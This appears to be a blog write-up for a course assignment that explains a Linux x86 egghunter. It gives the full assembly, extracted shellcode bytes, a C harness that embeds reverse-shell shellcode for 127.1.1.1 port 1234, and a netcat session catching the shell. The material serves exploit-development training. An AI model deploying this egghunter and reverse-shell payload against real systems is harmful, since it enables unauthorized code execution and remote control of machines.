---
layout: post
title: Linux x86 Egghunter
tags: [slae]
---

This is the third assignment for the SLAE which is creating an Egghunter. So what is an Egghunter and why is it useful? Perhaps you have a buffer overflow but space is limited on the buffer and you're unable to fit all of your shellcode in one spot. What do you do? Well an egghunter could be the solution to your problem. 

An egg is simply a marker than can be set in front of your shellcode and then looked for in memory by an egghunter. Generally your egg should be unique and repeated twice. The reason for the repetition is to avoid the egghunter from recognizing itself during the search and jumping to the wrong spot. Once the egg is found by the egghunter, it simply jumps to your shellcode for execution. 

So how is this accomplished? Well the famous paper by Skape goes into detail on a few different techniques that can be used. Please check out that resource [here](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf). 

For the purposes of this writeup we'll be utilizing the sigaction() method since it is the most efficient. We'll be using the sigaction() syscall to verify valid memory addresses to search for our egg in.

First let's take a look at the sigaction() syscall in the man pages.


```
NAME
       sigaction - examine and change a signal action

SYNOPSIS
       #include <signal.h>

       int sigaction(int signum, const struct sigaction *act,
                     struct sigaction *oldact);
```

We can see that sigaction takes three arguments, `signum` will be in EBX, the `act` pointer in ECX and `oldact` point in EDX. 

If we look further down in the man page we see the following:

```
ERRORS
       EFAULT act  or oldact points to memory which is not a valid part of the
              process address space.
```

What this means is that we can use the `act` pointer as a way to check for valid addresses in memory. If we check for an address that is not valid we'll get an `EFAULT` error returned. 

So for the purposes of our needs, we'll be putting in various memory addresses in ECX to have sigaction() check if its valid or not. If the memory is valid (`EFAULT` is not returned in EAX) then we'll search it for our egg. 

To get started we'll need to find the syscall number for sigaction() which is defined as 67 in `/usr/include/i386-linux-gnu/asm/unistd_32.h` on our Ubuntu box.

We'll also need to know the return value for an `EFAULT` which can be found in `/usr/include/asm-generic/errno-base.h` as 14. Since this is an error code it will actually be returned as a negative 14 thus in hex we get back 0xfffffff2 as the value. If this doesn't make sense to you check out two's complement to understand the negative number.  

Now that we have a way to search for valid memory we'll need a method to search for our egg efficiently. To accomplish this we'll utilize the SCASD assembly instruction which will compare EAX to a DWORD value located in EDI and set status flags for the result. If the comparison is a success the ZF (zero flag) will be set in EFLAGS.

After the comparison is ran, EDI will be automatically incremented by 4. This incrementation allows us to call SCASD again to do the second check to verify our egg has been found (remember we repeat the egg twice). If both of the SCASD checks pass then we'll know we've found our shellcode and we can JMP directly to EDI, which will have automatically be incremented to the start of our shellcode thanks to SCASD.

A summary on what needs to happen.

- We first need to set the ECX register to the bottom of the memory address space for sigaction to check. Page sizes in Linux x86 are 4096 which in hex is 0x1000, this contains nulls so to avoid this we'll need to first put 4095 into ECX then increment by 1 to get what we want.

- We then need to execute sigaction and check for the EFAULT return value (AL is checked with 0xf2 to save space).

- If `EFAULT` is returned we need to increment the memory page address and rerun sigaction to continue searching for valid memory addresses.

- If `EFAULT` is not returned we know we have a valid address, so we load our egg in EAX, move the current valid address we want to check against (currently stored in ECX) to EDI and run SCASD to check if we have a match.

- If there is no match, we need to increment our memory address and redo the process.

- If there is a match, we'll need to check for our egg again with SCASD.

- If there is no match, increment the memory address and redo the process again. If it is a match again, we've found our egg and can jump to EDI for execution.


## Final Assembly Code

```nasm
global _start

section .text
_start:

next_page:

	or cx,0xfff            ; set cx to 4095

next_address:

	inc ecx			; increment to 4096	
	push byte +0x43         ; sigaction()
	pop eax                 ; put syscall in eax
	int 0x80                ; execute sigaction()
	cmp al,0xf2             ; check for EFAULT
	jz next_page            ; if EFAULT jump to next page in memory
	mov eax, 0x50905090     ; move EGG in EAX
	mov edi, ecx            ; move address to be checked by scasd
	scasd                   ; is eax == edi? if so edi is incremented by 4 bytes
	jnz next_address        ; if not try with the next address
	scasd                   ; check for second half of EGG
	jnz next_address        ; if not try with next address
	jmp edi                 ; if EGG is found again, jmp to shellcode

```

## Testing the Code

First we'll need to compile and extract our egghunter shellcode.

```
absolomb@ubuntu:~/SLAE/assignments/3$ ./compile.sh egghunter
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
absolomb@ubuntu:~/SLAE/assignments/3$ for i in $(objdump -d egghunter |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7
```

Once that is done a simple C program can be used along with our shellcode for the TCP reverse shell from the previous post.

```c
#include<stdio.h>
#include<string.h>


#define EGG "\x90\x50\x90\x50"

unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"
EGG
"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

// Reverse Shell on 127.1.1.1 port 1234
unsigned char code[] = \
EGG EGG
"\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x5b\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x87\xdf\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80";

main()
{
	
	printf("Egghunter Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
```

Notice in the code we aren't calling our reverse shell shellcode directly, only the egghunter. We can use any payload we like, we just have to make the modifications to the `code` variable.  

Let's compile and test.

```
absolomb@ubuntu:~/SLAE/assignments/3$ gcc egghunter.c -o egghunter -fno-stack-protector -z execstack
absolomb@ubuntu:~/SLAE/assignments/3$ ./egghunter
Egghunter Length:  30
Shellcode Length:  84
```

In another terminal we catch our shell

```
absolomb@ubuntu:~$ nc -lvnp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 48094)
id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

Success!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1208

Github Repo: <https://github.com/absolomb/SLAE>